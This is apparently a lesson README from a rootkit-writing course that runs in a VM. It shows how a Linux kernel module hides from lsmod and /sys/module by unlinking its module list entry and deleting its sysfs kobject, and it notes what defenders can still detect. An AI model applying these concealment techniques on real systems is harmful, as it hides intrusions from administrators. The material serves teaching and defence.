# 37 - Sysfs hiding

## Why this step

Ling 36 hid the module from `lsmod`, but `/sys/module/hello` still
exists. This ling removes that entry too, demonstrating that the module list
and module kobject are independent views.

## The concept

```
  Two separate data structures expose your module:

  1. Module list (THIS_MODULE->list)
     lsmod, /proc/modules
     +-- hello  <-- list_del_init removes this (ling 36)

  2. Sysfs kobject (THIS_MODULE->mkobj.kobj)
     /sys/module/hello/
     +-- parameters/
     +-- sections/
     +-- ...    <-- kobject_del removes this (this ling)

  Removing both suppresses these two views only.
```

## What you already know

From ling 36, you removed your module from the module list. This ling
adds kobject removal so both `lsmod` and `ls /sys/module/` are clean.

## Build it

You need:

```c
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
```

Create a module that:

1. Hides from the module list (ling 36).
2. Removes its sysfs kobject.
3. After both, `lsmod` and `ls /sys/module/` are clean.

```c
list_del_init(&THIS_MODULE->list);
kobject_del(&THIS_MODULE->mkobj.kobj);
```

## Try it

```bash
./rootkitlings run
```

Inside the VM:

```sh
insmod hello.ko
lsmod                           # hello should NOT appear
ls /sys/module/hello 2>&1       # should also be gone now
cat /proc/rk_sysfs                 # still accessible
```

## Contract

The check script verifies:

- `/proc/rk_sysfs` returns `hidden`.
- Module does NOT appear in `lsmod`.
- Module does NOT appear in `/sys/module/hello`.

## Verify

```bash
./rootkitlings check 37
```

> **What a defender sees**: these two views are empty, but the module's code,
> allocations, callbacks, and other subsystem references still exist. Memory
> inspection and independent subsystem views do not depend on this kobject.

See also: [38 - Getdents64 hiding](../38-getdents64/README.md).
